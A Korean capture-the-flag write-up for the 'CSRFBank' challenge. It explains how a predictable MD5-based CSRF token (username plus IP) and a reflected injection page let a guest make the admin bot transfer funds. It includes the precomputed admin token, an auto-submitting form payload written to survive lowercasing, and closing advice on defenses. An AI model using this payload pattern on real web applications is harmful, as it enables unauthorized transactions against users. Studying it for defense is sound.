# CSRFBank Writeup

## 문제 개요

가상의 은행 서비스 **CSRFBank**에서 admin의 돈을 탈취해 플래그를 구매하는 문제입니다.

- 플래그 가격: **2,147,483,647원** (상점에서 구매)
- guest 초기 잔액: **0원**
- admin 잔액: **4,294,967,295원**
- 게임으로 돈을 벌 수 있지만 한 문제당 1원 → 정공법은 불가능
- 즉 **admin → guest 송금**을 강제로 발생시켜야 함

## 엔드포인트 분석

| 경로 | 메서드 | 설명 |
|---|---|---|
| `/login` | POST | 로그인 (세션 발급) |
| `/transfer` | POST | 송금. **`csrf_token` 필요** |
| `/flag` | POST | 사용자가 작성한 페이로드를 admin 봇에게 전달 |
| `/vuln` | GET | 봇이 방문하는 페이지. `param` 쿼리값을 그대로 렌더링 |
| `/shop` | POST | 플래그 구매 |

### CSRF 토큰 생성 방식 (취약점 핵심)

```python
def create_session(username, remote_addr):
    session_id = os.urandom(8).hex()
    session_storage[session_id] = username
    token_storage[session_id] = md5((username + remote_addr).encode()).hexdigest()
    return session_id
```

CSRF 토큰이 **사용자 본인의 정보(username + 접속 IP)만으로 결정**됩니다. 랜덤 시크릿이 섞이지 않으므로 공격자가 **admin의 토큰을 미리 계산 가능**합니다.

봇은 같은 컨테이너 내부에서 `http://127.0.0.1:8000`으로 접속하므로:

```
admin_token = md5("admin" + "127.0.0.1") = 7505b9c72ab4aa94b1a4ed7b207b67fb
```

### admin 봇 동작

`/flag`에 페이로드를 제출하면 서버는 Selenium 봇을 띄워서:

1. admin 세션 쿠키를 가진 채로
2. `http://127.0.0.1:8000/vuln?param=<제출한 페이로드>` 에 방문

`/vuln`은 받은 `param`을 **소문자로 변환 후 그대로 응답 본문에 출력**합니다. 즉 HTML/JS 주입 가능한 reflected 시나리오이며, 봇 입장에서는 자기가 admin 세션을 가진 채 이 HTML을 렌더링하게 됩니다.

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    return param
```

## 익스플로잇 시나리오

1. guest로 로그인
2. `/flag`에 다음 페이로드 제출:
   - 자동 송금 폼 + `submit()` 호출하는 인라인 스크립트
3. 봇(admin 세션)이 `/vuln`을 방문 → 페이로드 렌더링
4. 인라인 스크립트가 `/transfer`로 자동 POST → admin → guest 송금 완료
5. guest 계정으로 `/shop`에서 플래그 구매

## 최종 페이로드

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="to" value="guest">
  <input type="hidden" name="amount" value="2147483647">
  <input type="hidden" name="csrf_token" value="7505b9c72ab4aa94b1a4ed7b207b67fb">
</form>
<script>document.forms[0].submit();</script>
```

### 주의할 점: `.lower()` 처리

`/vuln`이 param을 **소문자로 변환**하므로 페이로드의 JS는 소문자만으로 동작해야 합니다.

- `document.getElementById("f")` → `document.getelementbyid("f")` → JS는 대소문자 구분이므로 **에러**
- `document.forms[0].submit()` → 이미 전부 소문자 → **정상 동작** ✅

## 핵심 포인트

1. **CSRF 토큰이 예측 가능하면 무용지물**: 사용자 정보만으로 토큰을 만들면 공격자가 미리 계산할 수 있음. 랜덤 시크릿 + 세션 ID 기반으로 생성해야 함.
2. **`/vuln`처럼 사용자 입력을 그대로 렌더링하면 reflected XSS / CSRF 트리거 페이지가 됨**: `.lower()` 같은 단순 필터링으로는 막을 수 없음.
3. **SameSite 쿠키 미설정**: `sessionid` 쿠키에 `SameSite=Lax` 이상이 설정되어 있었다면 cross-origin form submit으로는 쿠키가 안 붙어서 공격이 막혔을 것. (여기서는 봇이 같은 origin에서 트리거하기 때문에 SameSite로도 못 막지만 일반적인 CSRF에서는 핵심 방어책)
4. **올바른 방어책**: 세션마다 고유한 랜덤 CSRF 토큰 + `SameSite=Lax/Strict` 쿠키 + `Origin/Referer` 검증.

## 참고: 의도된 솔루션 동작 흐름

```
[guest] ──POST /flag (payload)──> [server]
                                       │
                                       └──▶ Selenium 봇 기동 (admin 세션 주입)
                                                │
                                                ▼
                                       GET /vuln?param=<payload>
                                                │
                                                ▼
                                       페이지에 폼 렌더링 + JS 자동 실행
                                                │
                                                ▼
                                       POST /transfer (admin 쿠키 + 미리 계산된 토큰)
                                                │
                                                ▼
                                       admin → guest 송금 성공
                                       
[guest] ──POST /shop──> 플래그 획득
```
